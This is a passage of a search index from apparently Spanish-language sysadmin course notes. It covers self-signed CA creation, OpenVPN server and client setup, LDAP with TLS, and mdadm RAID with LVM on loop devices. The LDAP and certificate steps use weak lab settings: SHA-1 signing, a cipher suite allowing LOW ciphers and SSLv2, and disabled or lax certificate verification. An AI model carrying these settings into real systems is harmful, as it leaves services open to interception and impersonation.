barcelona, L = barcelona, O = server vvpn, OU = VpnServer, CN = VpnServer Getting CA Private Key Archivos generados: \u279c tls19:vpn ll total 64K -rw-r--r-- 1 debian debian 1 ,4K abr 3 19 :29 cacert.pem -rw-r--r-- 1 debian debian 41 abr 3 19 :40 cacert.srl -rw------- 1 debian debian 1 ,7K abr 3 19 :27 cakey.pem -rw-r--r-- 1 debian debian 424 abr 4 11 :39 dh2048.pem -rw-r--r-- 1 debian debian 301 abr 3 19 :12 ext.server.conf -rw-r--r-- 1 debian debian 1 ,8K abr 3 19 :37 servercert.pem -rw------- 1 debian debian 1 ,7K abr 3 19 :30 serverkey.pem -rw-r--r-- 1 debian debian 1 ,1K abr 3 19 :32 serverreq.pem Generar llaves cliente Lo recomendable es que cada cliente tenga una llave propia para conectar con el servidor, por lo tanto estos pasos se deben repetir por cada cliente que quiera conectar con el servidor. generar llave de cliente y request para certificar. \u279c openssl genrsa -out cliekey1.pem 2048 Generating RSA private key, 2048 bit long modulus ( 2 primes ) ........................................................................+++++ ....................................................+++++ e is 65537 ( 0x010001 ) # generar request ( quien soy ) \u279c openssl req -new -key cliekey1.pem -out cliereq1.pem You are about to be asked to enter information that will be incorporated into your certificate request. What you are about to enter is what is called a Distinguished Name or a DN. There are quite a few fields but you can leave some blank For some fields there will be a default value, If you enter '.' , the field will be left blank. ----- Country Name ( 2 letter code ) [ AU ] :ca State or Province Name ( full name ) [ Some-State ] :barcelona Locality Name ( eg, city ) [] :barcelona Organization Name ( eg, company ) [ Internet Widgits Pty Ltd ] :cliente 1 server vpn Organizational Unit Name ( eg, section ) [] :cliente1 Common Name ( e.g. server FQDN or YOUR name ) [] :cliente1 Email Address [] : Please enter the following 'extra' attributes to be sent with your certificate request A challenge password [] :request password An optional company name [] :edt Generar certificado desde una CA, una CA verifica que eres quien dices ser. fichero de extensiones para cliente basicConstraints = CA:FALSE subjectKeyIdentifier = hash authorityKeyIdentifier = keyid,issuer:always \u279c openssl x509 -CAkey cakey.pem -CA cacert.pem -req -in cliereq1.pem -days 365 -CAcreateserial -extfile ext.client.conf -out cliecert1.pem Signature ok subject = C = ca, ST = barcelona, L = barcelona, O = cliente 1 server vpn, OU = cliente1, CN = cliente1 Getting CA Private Key Archivos generados para cliente: \u279c ll -rw-r--r-- 1 debian debian 1 ,4K abr 3 19 :29 cacert.pem -rw-r--r-- 1 debian debian 1 ,6K abr 3 19 :40 cliecert1.pem -rw------- 1 debian debian 1 ,7K abr 3 19 :38 cliekey1.pem -rw-r--r-- 1 debian debian 3 ,6K abr 3 19 :15 client.conf -rw-r--r-- 1 debian debian 1 ,1K abr 3 19 :40 cliereq1.pem -rw-r--r-- 1 debian debian 113 abr 3 19 :13 ext.client.conf T\u00fanel manual Una manera de verificar que los certificados funcionan correctamente es creando un t\u00fanel manualmente, si funcionan correctamente pasamos va configurar el servidor. pc02 \u279c sudo openvpn --remote pc03 --dev tun1 --ifconfig 10 .4.0.1 10 .4.0.2 --tls-server --dh dh2048.pem --ca cacert.pem --cert servercert.pem --key serverkey.pem --reneg-sec 60 [ jorge@pc03 certs ] $ sudo openvpn --remote pc02 --dev tun1 --ifconfig 10 .4.0.2 10 .4.0.1 --tls-client --ca cacert.pem --cert cliecert1.pem --key cliekey1.pem --reneg-sec 60 Configurar Servidor Primero de todo hacemos una copia del servicio y lo modificamos para tener una configuraci\u00f3n como se ve en el siguiente recuadro [ fedora@aws ~ ] $ sudo cp /lib/systemd/system/openvpn-server@.service /etc/systemd/system/. [ fedora@aws ~ ] $ cat /etc/systemd/system/openvpn-server \\@ .service [ Unit ] Description = OpenVPN service for %I hisx After = syslog.target network-online.target [ Service ] Type = forking PrivateTmp = true ExecStartPre = /usr/bin/echo serveri %i %I PIDFile = /var/run/openvpn-server/%i.pid ExecStart = /usr/sbin/openvpn --daemon --writepid /var/run/openvpn-server/%i.pid --cd /etc/openvpn/ --config %i.conf [ Install ] WantedBy = multi-user.target Cogemos el archivo de configuraci\u00f3n de muestra y lo modificamos de la siguiente manera. [ fedora@aws ~ ] $ cp /usr/share/doc/openvpn/sample/sample-config-files/server.conf . [ fedora@aws ~ ] $ sudo cp server.conf /etc/openvpn/confserver.conf [ fedora@aws ~ ] $ cat /etc/openvpn/confserver.conf port 1194 proto udp dev tun # interfaz de vpn # nuestras llaves para el server ca /etc/openvpn/keys/cacert.pem cert /etc/openvpn/keys/servercert.pem key /etc/openvpn/keys/serverkey.pem dh /etc/openvpn/keys/dh2048.pem server 10 .8.0.0 255 .255.255.0 # red del vpn ifconfig-pool-persist ipp.txt client-to-client # clientes se ven entre ellos ; duplicate-cn # no permitir diferentes conexxiones con la misma llave keepalive 10 120 cipher AES-256-CBC comp-lzo # compresion persist-key persist-tun # datos de logs status openvpn-status.log verb 3 explicit-exit-notify 1 Los archivos de configuraci\u00f3n quedan con la siguiente estructura. [ fedora@ip-172-31-92-8 ~ ] $ sudo tree /etc/openvpn/ /etc/openvpn/ \u251c\u2500\u2500 client \u251c\u2500\u2500 confserver.conf \u251c\u2500\u2500 ipp.txt \u251c\u2500\u2500 keys \u2502 \u251c\u2500\u2500 cacert.pem \u2502 \u251c\u2500\u2500 dh2048.pem \u2502 \u251c\u2500\u2500 servercert.pem \u2502 \u2514\u2500\u2500 serverkey.pem \u251c\u2500\u2500 openvpn-status.log \u2514\u2500\u2500 server Poner en marcha el servidor. Al poner en marcha el servidor Hay que tener en cuenta que hemos modificado un dominio manualmente, por eso se han de recargar. Otra cosa a tener en cuenta es que en el start, hay que indicar el nombre del archivo de configuraci\u00f3n openvpn-server@confserver # recargar los dominios [ fedora@aws ~ ] $ sudo systemctl daemon-reload # encender el servidor [ fedora@aws ~ ] $ sudo systemctl start openvpn-server@confserver.service # comprovar interfaz creada [ fedora@aws ] $ ip a s tun0 8 : tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 100 link/none inet 10 .8.0.1 peer 10 .8.0.2/32 scope global tun0 valid_lft forever preferred_lft forever inet6 fe80::b502:a827:5610:7c23/64 scope link stable-privacy valid_lft forever preferred_lft forever Cliente En la configuraci\u00f3n del cliente es mas simple, ya que solo se a de modificar el archivo de configuraci\u00f3n, agregar las llaves del cliente en su sitio y arrancar el servicio. Todos estos pasos se han de hacer por cada cliente con sus claves propias. Archivo de configuraci\u00f3n: [ jorge@pc03 ] $ sudo cat client/confclient.conf client dev tun proto udp remote aws 1194 # ip/host port del servidor remoto resolv-retry infinite nobind persist-key persist-tun # certificados ca /etc/openvpn/keys/cacert.pem cert /etc/openvpn/keys/cliecert1.pem key /etc/openvpn/keys/cliekey1.pem remote-cert-tls server cipher AES-256-CBC comp-lzo verb 3 Se colocan las llaves en su sitio indicado [ jorge@pc03 openvpn ] $ sudo tree . \u251c\u2500\u2500 client \u2502 \u2514\u2500\u2500 confclient.conf \u251c\u2500\u2500 keys \u2502 \u251c\u2500\u2500 cacert.pem \u2502 \u251c\u2500\u2500 cliecert1.pem \u2502 \u2514\u2500\u2500 cliekey1.pem \u2514\u2500\u2500 server Como no tengo resoluci\u00f3n dns indico la resoluci\u00f3n en el /etc/hosts [ jorge@pc03 ] $ cat /etc/hosts 127 .0.0.1 localhost localhost.localdomain localhost4 localhost4.localdomain4 ::1 localhost localhost.localdomain localhost6 localhost6.localdomain6 3 .86.219.56 aws Arrancar y comprobar. # arrancar servicio, con el nombre del archivo de configuraci\u00f3n [ jorge@pc03 ] $ sudo systemctl start openvpn-client@confclient # verificar que se a creado la interfaz [ jorge@pc03 ] $ ip a s tun0 9 : tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 100 link/none inet 10 .8.0.6 peer 10 .8.0.5/32 scope global tun0 valid_lft forever preferred_lft forever inet6 fe80::7b5f:a77b:2a32:be1e/64 scope link stable-privacy valid_lft forever preferred_lft forever # comprovar que llego al otro extremo [ jorge@pc03 ] $ curl 10 .8.0.1:13 04 APR 2020 11 :26:59 UTC","title":"Practica ssl tls"},{"location":"seguridad/practica-ssl-tls/#ldap-tls","text":"Ldap con conexiones seguras TLS/SSL y startTLS.","title":"Ldap tls"},{"location":"seguridad/practica-ssl-tls/#generar-certificados","text":"# genrar llaves privadas, del servidor. openssl genrsa -out cakey.pem 2048 openssl genrsa -out serverkey.pem 2048 # genrar certificado propio de la entidad CA por 365 dias openssl req -new -x509 -nodes -sha1 -days 365 -key cakey.pem -out cacrt.pem You are about to be asked to enter information that will be incorporated into your certificate request. What you are about to enter is what is called a Distinguished Name or a DN. There are quite a few fields but you can leave some blank For some fields there will be a default value, If you enter '.' , the field will be left blank. ----- Country Name ( 2 letter code ) [ AU ] :ca State or Province Name ( full name ) [ Some-State ] :Barcelona Locality Name ( eg, city ) [] :Barcelona Organization Name ( eg, company ) [ Internet Widgits Pty Ltd ] :Varitat Absoluta Organizational Unit Name ( eg, section ) [] :Dep de certificats Common Name ( e.g. server FQDN or YOUR name ) [] :VeritatAbsoluta Email Address [] :admin@edt.org # generar una de certificado request para enviar a la entidad certificadora CA openssl req -new -key serverkey.pem -out servercsr.pem You are about to be asked to enter information that will be incorporated into your certificate request. What you are about to enter is what is called a Distinguished Name or a DN. There are quite a few fields but you can leave some blank For some fields there will be a default value, If you enter '.' , the field will be left blank. ----- Country Name ( 2 letter code ) [ AU ] :ca State or Province Name ( full name ) [ Some-State ] :Barcelona Locality Name ( eg, city ) [] :Barcelona Organization Name ( eg, company ) [ Internet Widgits Pty Ltd ] :escola de mi casa Organizational Unit Name ( eg, section ) [] :dep informatica Common Name ( e.g. server FQDN or YOUR name ) [] :ldap.edt.org Email Address [] :admin@edt.org Please enter the following 'extra' attributes to be sent with your certificate request A challenge password [] :request password An optional company name [] :edt # Una entidad CA a de firmar el servercsr.pem y devolvernos un certificado.crt, como hago yo mismo de entidad cat ca.conf basicConstraints = critical,CA:FALSE extendedKeyUsage = serverAuth,emailProtection # Autoridad CA firmando el certificado openssl x509 -CA cacrt.pem -CAkey cakey.pem -req -in servercsr.pem -days 365 -sha1 -extfile ca.conf -CAcreateserial -out servercrt.pem Signature ok subject = C = ca, ST = Barcelona, L = Barcelona, O = escola de mi casa, OU = dep informatica, CN = ldap.edt.org, emailAddress = admin@edt.org Getting CA Private Key # archivos finales \u279c ll total 60K -rw-r--r-- 1 debian debian 83 abr 1 10 :14 ca.conf -rw-r--r-- 1 debian debian 1 ,5K abr 1 10 :23 cacrt.pem -rw-r--r-- 1 debian debian 41 abr 1 10 :35 cacrt.srl -rw------- 1 debian debian 1 ,7K abr 1 10 :14 cakey.pem -rw-r--r-- 1 debian debian 1 ,5K abr 1 10 :35 servercrt.pem -rw-r--r-- 1 debian debian 1 ,2K abr 1 10 :32 servercsr.pem -rw------- 1 debian debian 1 ,7K abr 1 10 :14 serverkey.pem","title":"Generar certificados"},{"location":"seguridad/practica-ssl-tls/#configuracion","text":"slapd.conf --- TLSCACertificateFile /etc/openldap/certs/cacrt.pem TLSCertificateFile /etc/openldap/certs/servercrt.pem TLSCertificateKeyFile /etc/openldap/certs/serverkey.pem TLSVerifyClient never TLSCipherSuite HIGH:MEDIUM:LOW:+SSLv2 --- ldap.conf --- TLS_CACERT /etc/openldap/certs/cacrt.pem SASL_NOCANON on URI ldap://ldap.edt.org BASE dc = edt,dc = org --- startup.sh --- /sbin/slapd -d0 -h \"ldap:/// ldaps:/// ldapi:///\" --- cliente ldap.conf TLS_CACERT /etc/ldap/cacrt.pem TLS_REQCERT allow URI ldap://ldap.edt.org BASE dc = edt,dc = org SASL_NOCANON on","title":"Configuraci\u00f3n"},{"location":"seguridad/practica-ssl-tls/#comprobaciones","text":"ldapsearch -x -LLL -ZZ dn ldapsearch -x -LLL -ZZ -h ldap.edt.org -b 'dc=edt,dc=org' dn ldapsearch -x -LLL -H ldaps://ldap.edt.org dn openssl s_client -connect ldap.edt.org:636","title":"Comprobaciones"},{"location":"seguridad/practica-ssl-tls/#docker","text":"\u279c docker run --rm --name ldap.edt.org -h ldap.edt.org -p 389 :389 -p 636 :636 -d jorgepastorr/ldapserver19:tls","title":"Docker"},{"location":"seguridad/practica-ssl-tls/#openvpn","text":"","title":"OpenVpn"},{"location":"seguridad/practica-ssl-tls/#generar-llaves-servidor","text":"Primero creamos nuestra CA \u279c openssl genrsa -des3 -out cakey.pem 2048 \u279c openssl req -new -x509 -nodes -sha1 -days 365 -key cakey.pem -out cacert.pem Enter pass phrase for cakey.pem: You are about to be asked to enter information that will be incorporated into your certificate request. What you are about to enter is what is called a Distinguished Name or a DN. There are quite a few fields but you can leave some blank For some fields there will be a default value, If you enter '.' , the field will be left blank. ----- Country Name ( 2 letter code ) [ AU ] :ca State or Province Name ( full name ) [ Some-State ] :Barcelona Locality Name ( eg, city ) [] :Barcelona Organization Name ( eg, company ) [ Internet Widgits Pty Ltd ] :Veritat absoluta Organizational Unit Name ( eg, section ) [] :Departament de certificats Common Name ( e.g. server FQDN or YOUR name ) [] :VeritatAbsoluta Email Address [] :admin@edt.org \u279c ll -rw-r--r-- 1 debian debian 1 ,5K mar 30 11 :24 cacert.pem -rw------- 1 debian debian 1 ,8K mar 30 11 :17 cakey.pem generar la llave del servidor y el request para enviar a la CA para que nos certifique. \u279c openssl dhparam -out dh2048.pem 2048 # llave del server \u279c openssl genrsa -out serverkey.pem 2048 Generating RSA private key, 2048 bit long modulus ( 2 primes ) .........................................+++++ ................................................................+++++ e is 65537 ( 0x010001 ) # request para la CA \u279c openssl req -new -key serverkey.pem -out serverreq.pem You are about to be asked to enter information that will be incorporated into your certificate request. What you are about to enter is what is called a Distinguished Name or a DN. There are quite a few fields but you can leave some blank For some fields there will be a default value, If you enter '.' , the field will be left blank. ----- Country Name ( 2 letter code ) [ AU ] :ca State or Province Name ( full name ) [ Some-State ] :barcelona Locality Name ( eg, city ) [] :barcelona Organization Name ( eg, company ) [ Internet Widgits Pty Ltd ] :server vvpn Organizational Unit Name ( eg, section ) [] :VpnServer Common Name ( e.g. server FQDN or YOUR name ) [] :VpnServer Email Address [] : Please enter the following 'extra' attributes to be sent with your certificate request A challenge password [] :request password An optional company name [] :edt Como no tenemos CA externa, simulamos una y nos auto certificamos. fichero de extensiones para servidor: basicConstraints = CA:FALSE nsCertType = server nsComment = \"OpenSSL Generated Server Certificate\" subjectKeyIdentifier = hash authorityKeyIdentifier = keyid,issuer:always extendedKeyUsage = serverAuth keyUsage = digitalSignature, keyEncipherment Generar certificado ( esto lo deber\u00eda hacer una certificadora externa a nosotros ) \u279c openssl x509 -CAkey cakey.pem -CA cacert.pem -req -in serverreq.pem -days 365 -CAcreateserial -extfile ext.server.conf -out servercert.pem Signature ok subject = C = ca, ST = barcelona, L = barcelona, O = server vvpn, OU = VpnServer, CN = VpnServer Getting CA Private Key Archivos generados: \u279c tls19:vpn ll total 64K -rw-r--r-- 1 debian debian 1 ,4K abr 3 19 :29 cacert.pem -rw-r--r-- 1 debian debian 41 abr 3 19 :40 cacert.srl -rw------- 1 debian debian 1 ,7K abr 3 19 :27 cakey.pem -rw-r--r-- 1 debian debian 424 abr 4 11 :39 dh2048.pem -rw-r--r-- 1 debian debian 301 abr 3 19 :12 ext.server.conf -rw-r--r-- 1 debian debian 1 ,8K abr 3 19 :37 servercert.pem -rw------- 1 debian debian 1 ,7K abr 3 19 :30 serverkey.pem -rw-r--r-- 1 debian debian 1 ,1K abr 3 19 :32 serverreq.pem","title":"Generar llaves servidor"},{"location":"seguridad/practica-ssl-tls/#generar-llaves-cliente","text":"Lo recomendable es que cada cliente tenga una llave propia para conectar con el servidor, por lo tanto estos pasos se deben repetir por cada cliente que quiera conectar con el servidor. generar llave de cliente y request para certificar. \u279c openssl genrsa -out cliekey1.pem 2048 Generating RSA private key, 2048 bit long modulus ( 2 primes ) ........................................................................+++++ ....................................................+++++ e is 65537 ( 0x010001 ) # generar request ( quien soy ) \u279c openssl req -new -key cliekey1.pem -out cliereq1.pem You are about to be asked to enter information that will be incorporated into your certificate request. What you are about to enter is what is called a Distinguished Name or a DN. There are quite a few fields but you can leave some blank For some fields there will be a default value, If you enter '.' , the field will be left blank. ----- Country Name ( 2 letter code ) [ AU ] :ca State or Province Name ( full name ) [ Some-State ] :barcelona Locality Name ( eg, city ) [] :barcelona Organization Name ( eg, company ) [ Internet Widgits Pty Ltd ] :cliente 1 server vpn Organizational Unit Name ( eg, section ) [] :cliente1 Common Name ( e.g. server FQDN or YOUR name ) [] :cliente1 Email Address [] : Please enter the following 'extra' attributes to be sent with your certificate request A challenge password [] :request password An optional company name [] :edt Generar certificado desde una CA, una CA verifica que eres quien dices ser. fichero de extensiones para cliente basicConstraints = CA:FALSE subjectKeyIdentifier = hash authorityKeyIdentifier = keyid,issuer:always \u279c openssl x509 -CAkey cakey.pem -CA cacert.pem -req -in cliereq1.pem -days 365 -CAcreateserial -extfile ext.client.conf -out cliecert1.pem Signature ok subject = C = ca, ST = barcelona, L = barcelona, O = cliente 1 server vpn, OU = cliente1, CN = cliente1 Getting CA Private Key Archivos generados para cliente: \u279c ll -rw-r--r-- 1 debian debian 1 ,4K abr 3 19 :29 cacert.pem -rw-r--r-- 1 debian debian 1 ,6K abr 3 19 :40 cliecert1.pem -rw------- 1 debian debian 1 ,7K abr 3 19 :38 cliekey1.pem -rw-r--r-- 1 debian debian 3 ,6K abr 3 19 :15 client.conf -rw-r--r-- 1 debian debian 1 ,1K abr 3 19 :40 cliereq1.pem -rw-r--r-- 1 debian debian 113 abr 3 19 :13 ext.client.conf","title":"Generar llaves cliente"},{"location":"seguridad/practica-ssl-tls/#tunel-manual","text":"Una manera de verificar que los certificados funcionan correctamente es creando un t\u00fanel manualmente, si funcionan correctamente pasamos va configurar el servidor. pc02 \u279c sudo openvpn --remote pc03 --dev tun1 --ifconfig 10 .4.0.1 10 .4.0.2 --tls-server --dh dh2048.pem --ca cacert.pem --cert servercert.pem --key serverkey.pem --reneg-sec 60 [ jorge@pc03 certs ] $ sudo openvpn --remote pc02 --dev tun1 --ifconfig 10 .4.0.2 10 .4.0.1 --tls-client --ca cacert.pem --cert cliecert1.pem --key cliekey1.pem --reneg-sec 60","title":"T\u00fanel manual"},{"location":"seguridad/practica-ssl-tls/#configurar","text":"","title":"Configurar"},{"location":"seguridad/practica-ssl-tls/#servidor","text":"Primero de todo hacemos una copia del servicio y lo modificamos para tener una configuraci\u00f3n como se ve en el siguiente recuadro [ fedora@aws ~ ] $ sudo cp /lib/systemd/system/openvpn-server@.service /etc/systemd/system/. [ fedora@aws ~ ] $ cat /etc/systemd/system/openvpn-server \\@ .service [ Unit ] Description = OpenVPN service for %I hisx After = syslog.target network-online.target [ Service ] Type = forking PrivateTmp = true ExecStartPre = /usr/bin/echo serveri %i %I PIDFile = /var/run/openvpn-server/%i.pid ExecStart = /usr/sbin/openvpn --daemon --writepid /var/run/openvpn-server/%i.pid --cd /etc/openvpn/ --config %i.conf [ Install ] WantedBy = multi-user.target Cogemos el archivo de configuraci\u00f3n de muestra y lo modificamos de la siguiente manera. [ fedora@aws ~ ] $ cp /usr/share/doc/openvpn/sample/sample-config-files/server.conf . [ fedora@aws ~ ] $ sudo cp server.conf /etc/openvpn/confserver.conf [ fedora@aws ~ ] $ cat /etc/openvpn/confserver.conf port 1194 proto udp dev tun # interfaz de vpn # nuestras llaves para el server ca /etc/openvpn/keys/cacert.pem cert /etc/openvpn/keys/servercert.pem key /etc/openvpn/keys/serverkey.pem dh /etc/openvpn/keys/dh2048.pem server 10 .8.0.0 255 .255.255.0 # red del vpn ifconfig-pool-persist ipp.txt client-to-client # clientes se ven entre ellos ; duplicate-cn # no permitir diferentes conexxiones con la misma llave keepalive 10 120 cipher AES-256-CBC comp-lzo # compresion persist-key persist-tun # datos de logs status openvpn-status.log verb 3 explicit-exit-notify 1 Los archivos de configuraci\u00f3n quedan con la siguiente estructura. [ fedora@ip-172-31-92-8 ~ ] $ sudo tree /etc/openvpn/ /etc/openvpn/ \u251c\u2500\u2500 client \u251c\u2500\u2500 confserver.conf \u251c\u2500\u2500 ipp.txt \u251c\u2500\u2500 keys \u2502 \u251c\u2500\u2500 cacert.pem \u2502 \u251c\u2500\u2500 dh2048.pem \u2502 \u251c\u2500\u2500 servercert.pem \u2502 \u2514\u2500\u2500 serverkey.pem \u251c\u2500\u2500 openvpn-status.log \u2514\u2500\u2500 server Poner en marcha el servidor. Al poner en marcha el servidor Hay que tener en cuenta que hemos modificado un dominio manualmente, por eso se han de recargar. Otra cosa a tener en cuenta es que en el start, hay que indicar el nombre del archivo de configuraci\u00f3n openvpn-server@confserver # recargar los dominios [ fedora@aws ~ ] $ sudo systemctl daemon-reload # encender el servidor [ fedora@aws ~ ] $ sudo systemctl start openvpn-server@confserver.service # comprovar interfaz creada [ fedora@aws ] $ ip a s tun0 8 : tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 100 link/none inet 10 .8.0.1 peer 10 .8.0.2/32 scope global tun0 valid_lft forever preferred_lft forever inet6 fe80::b502:a827:5610:7c23/64 scope link stable-privacy valid_lft forever preferred_lft forever","title":"Servidor"},{"location":"seguridad/practica-ssl-tls/#cliente","text":"En la configuraci\u00f3n del cliente es mas simple, ya que solo se a de modificar el archivo de configuraci\u00f3n, agregar las llaves del cliente en su sitio y arrancar el servicio. Todos estos pasos se han de hacer por cada cliente con sus claves propias. Archivo de configuraci\u00f3n: [ jorge@pc03 ] $ sudo cat client/confclient.conf client dev tun proto udp remote aws 1194 # ip/host port del servidor remoto resolv-retry infinite nobind persist-key persist-tun # certificados ca /etc/openvpn/keys/cacert.pem cert /etc/openvpn/keys/cliecert1.pem key /etc/openvpn/keys/cliekey1.pem remote-cert-tls server cipher AES-256-CBC comp-lzo verb 3 Se colocan las llaves en su sitio indicado [ jorge@pc03 openvpn ] $ sudo tree . \u251c\u2500\u2500 client \u2502 \u2514\u2500\u2500 confclient.conf \u251c\u2500\u2500 keys \u2502 \u251c\u2500\u2500 cacert.pem \u2502 \u251c\u2500\u2500 cliecert1.pem \u2502 \u2514\u2500\u2500 cliekey1.pem \u2514\u2500\u2500 server Como no tengo resoluci\u00f3n dns indico la resoluci\u00f3n en el /etc/hosts [ jorge@pc03 ] $ cat /etc/hosts 127 .0.0.1 localhost localhost.localdomain localhost4 localhost4.localdomain4 ::1 localhost localhost.localdomain localhost6 localhost6.localdomain6 3 .86.219.56 aws Arrancar y comprobar. # arrancar servicio, con el nombre del archivo de configuraci\u00f3n [ jorge@pc03 ] $ sudo systemctl start openvpn-client@confclient # verificar que se a creado la interfaz [ jorge@pc03 ] $ ip a s tun0 9 : tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 100 link/none inet 10 .8.0.6 peer 10 .8.0.5/32 scope global tun0 valid_lft forever preferred_lft forever inet6 fe80::7b5f:a77b:2a32:be1e/64 scope link stable-privacy valid_lft forever preferred_lft forever # comprovar que llego al otro extremo [ jorge@pc03 ] $ curl 10 .8.0.1:13 04 APR 2020 11 :26:59 UTC","title":"Cliente"},{"location":"seguridad/raid/","text":"Raid Modos de raid Firmware El modo de raid firmware es el raid basado en la BIOS, la propia BIOS tiene su controladora para gestionar la raid . Hardware El modo Hardware, consiste en una tarjeta pinchada en la placa que controla la raid. Software El modo Software es el propio sistema operativo que gestiona la raid. Tipo de raid tipo de raid wikipedia Raid software assemble construye la raid a partir de los superbloques build crea la raid sin a\u00f1adir la marca de superbloque al disco create crea la raid a\u00f1adiendo superbloques en sus discos Niveles de raid Calculadora raid Nivel n\u00ba discos n\u00ba discos que pueden fallar capacidad capacidad leer y escribir R0 2 0 100% excelente R1 2 max 1 50% L.MuyBuena / E.Buena R5 3 min 1 67% - 94% L.Muy buena / E.Buena R6 4 min 2 50% - 88% L.Buena / E.Buena R10 4 min 1 por cada mirror 50% L.Muy buena / E.Buena R50 6 min 1 por cada mirror 67% - 94% L.Excelente / E.Muy buena R60 8 min 2 por cada mirror 50% - 88% L.Muy buena / E.Buena Raid 0 Escribe y lee en los discos a la vez reparti\u00e9ndose la faena, resultado una escritura y lectura excelente. Lo malo que no tiene margen de error, si falla un disco pierdes los datos. Raid 1 Escribe en los 2 discos a la vez por si falla 1 tener el otro de backup. Raid 5 Hace una paridad de datos cada 2 bits genera un tercero de seguridad por si falla alg\u00fan disco. Raid 6 Hace lo mismo que raid 5 pero generando 2 bits de paridad, por lo tanto hay posibilidad de que fallen 2 discos sin perder datos. Raid 10 Son dos raid 1 unidas por una raid 0 , nivel de seguridad alto 1 disco por mirror pero se reduce la capacidad total de almacenamiento al 50% total. Raid 50 Dos raid 5 unidas por raid 0 velocidad excelente de lectura con nivel de seguridad alto de 2 discos de fallo. Raid 60 Dos raid 6 unidas por raid 0 m\u00e1xima seguridad en raid posibilidad de que fallen 4 discos dos por cada raid 6. una probabilidad muy peque\u00f1a. Crear raid sudo mdadm --create /dev/md0 --level = 1 --raid-devices = 3 /dev/loop0 /dev/loop1 /dev/loop2 sudo mdadm --create /dev/md/dades --level = 1 --raid-devices = 2 /dev/loop0 /dev/loop1 --spare-devices = 2 /dev/loop2 /dev/loop3 Al crear la raid inserta un peque\u00f1o bloque de datos en cada disco para gestionar la raid. Ver Informaci\u00f3n Raid sudo mdadm --detail /dev/md0 # ver estado del raid sudo mdadm --detail --scan # ver si existe alguna raid sudo mdadm --examine /dev/loop0 # ver datos del bloque raid en disco sudo mdadm --query /dev/loop0 sudo mdadm --query /dev/md0 cat /proc/mdstat # ver estado de raid Extraer disco sudo mdadm /dev/md0 --fail /dev/loop1 sudo mdadm /dev/md0 --remove /dev/loop1 A\u00f1adir disco sudo mdadm --manage /dev/md0 --add /dev/loop1 En este paso si los discos de la raid tienen datos, tardara en a\u00f1adirse por que tiene que sincronizarse. A\u00f1adir Spare Spare son los discos de reserva, cuando falla un disco de datos, este se empieza a sincronizar autom\u00e1ticamente. sudo mdadm /dev/md0 --add-spare /dev/loop2 Parar Raid Para, parar la raid a de estar desmontada del sistema de archivos. sudo mdadm --stop /dev/md0 # parar raid md0 sudo mdadm --stop --scan # para todas las raid Guardar raid sudo mdadm --examine --scan > /etc/mdadm.conf Reconstruir raid Como se guardan datos de la raid en cada disco es posible reconstruir una raid autom\u00e1ticamente. sudo mdadm --assemble --scan # automatico, si existe /etc/mdadm.conf no escaneara todos los discos. sudo mdadm --assemble /dev/md0 --run /dev/loop0 /dev/loop1 /dev/loop2 # indicando discos sudo mdadm --assemble /dev/md0 # siempre que exista el archivo /etc/mdadm.conf y este md0 dentro Limpiar superbloque sudo mdadm --zero-superblock /dev/loop0 Reshape Aumentar discos Aumentar a 3 discos y a\u00f1adir el tercero. sudo mdadm --grow /dev/md/raid1 --raid-devices 3 --add /dev/loop2 Cambiar nivel de raid De level 1 a level 5, lvel 1 solo puede tener 2 discos. sudo mdadm --grow /dev/md/raid1 --level 5 Aumentar tama\u00f1o sudo mdadm --grow /dev/md/raid1 --size = max # si esta montada se tendr\u00e1 que espandir el sistem de ficheros sudo resize2fs /dev/md127 Raid y LVM Ejercicio practico: un raid 1 de 2v discos de 500 un raid 1 de 2v discos de 500 primer raid crear pv y vg lv de 200 sistema y 300 dades montar incorpoprar al vg el segundo raid incrementar sistema +100 provocar fail raid1 eliminar vel primer raid del vg Crear discos dd if = /dev/zero of = disc1.img bs = 1k count = 500k dd if = /dev/zero of = disc2.img bs = 1k count = 500k dd if = /dev/zero of = disc3.img bs = 1k count = 500k dd if = /dev/zero of = disc4.img bs = 1k count = 500k losetup /dev/loop0 disc1.img losetup /dev/loop1 disc2.img losetup /dev/loop2 disc3.img losetup /dev/loop3 disc4.img Crear raids mdadm --create /dev/md/raid1 --level 1 --raid-devices 2 /dev/loop0 /dev/loop1 mdadm --create /dev/md/raid2 --level 1 --raid-devices 2 /dev/loop2 /dev/loop3 Crear marca PV y VG pvcreate /dev/md/raid1 pvcreate /dev/md/raid2 vgcreate mydisc /dev/md/raid2 Crear LVs crear montar y a\u00f1adir datos lvcreate -L 200M -n sistema /dev/mydisc lvcreate -L 100M -n dades /dev/mydisc mkfs.ext4 /dev/mydisc/sistema mkfs.ext4 /dev/mydisc/dades mount /dev/mydisc/sistema /mnt/sistema mount /dev/mydisc/dades /mnt/dades cp -r /boot/grub2/ /mnt/sistema/s1 cp -r /boot/grub2/ /mnt/sistema/s2 cp -r /boot/grub2/ /mnt/dades/d1 cp -r /boot/grub2/ /mnt/dades/d2 cp -r /boot/grub2/ /mnt/dades/d3 Extender VG a las 2 raids vgextend mydisc /dev/md/raid2 Extender partici\u00f3n sistemas lvextend -L +100M /dev/mydisc/sistema resize2fs /dev/mydisc/sistema Extraer raid1 primaria # probocar fllo en disco mdadm /dev/md/raid1 --fail /dev/loop0 # mover datos al segundo raid pvmove /dev/md/raid1 /dev/md/raid2 # quitar vprimer raid del VG vgreduce mydisc /dev/md/raid1 # parar raid1 mdadm --stop /dev/md/raid1","title":"Raid"},{"location":"seguridad/raid/#raid","text":"","title":"Raid"},{"location":"seguridad/raid/#modos-de-raid","text":"","title":"Modos de raid"},{"location":"seguridad/raid/#firmware","text":"El modo de raid firmware es el raid basado en la BIOS, la propia BIOS tiene su controladora para gestionar la raid .","title":"Firmware"},{"location":"seguridad/raid/#hardware","text":"El modo Hardware, consiste en una tarjeta pinchada en la placa que controla la raid.","title":"Hardware"},{"location":"seguridad/raid/#software","text":"El modo Software es el propio sistema operativo que gestiona la raid.","title":"Software"},{"location":"seguridad/raid/#tipo-de-raid","text":"tipo de raid wikipedia","title":"Tipo de raid"},{"location":"seguridad/raid/#raid-software","text":"assemble construye la raid a partir de 